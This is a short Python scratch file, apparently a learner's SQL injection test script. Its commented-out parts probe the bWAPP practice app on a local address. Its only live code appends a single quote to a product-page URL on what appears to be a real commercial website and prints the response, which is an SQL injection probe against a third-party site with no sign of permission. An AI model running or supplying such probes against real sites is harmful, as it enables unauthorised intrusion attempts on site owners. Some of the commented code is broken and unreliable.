# # from urllib import request, parse
# from urllib import *

# uri = "http://192.168.1.22/bWAPP/sqli_1.php?title=%27&action=search"
# # arq = open("big.txt", "r").readlines()
# g = "'"

# http = request.Request(uri, data={'test':g, 'action':'submit'})
# r = request.get(uri)
# print(r.text)
# # print(http.text)
# # content = http.content


# --------------------
# import requests

# url = 'https://www.google.com/'
# r = requests.get(url)
# print (r.text)

# -----------------------------------
# import requests
# url = 'http://192.168.1.22/bWAPP/sqli_1.php?title=%27&action=search'
# data = dict(name="'")

# r = requests.post(url, data=data, allow_redirects=True)
# print r.content

import requests
url = "http://www.tunesoman.com/product.php?id=200%27"
r = requests.get(url)
print (r.content)
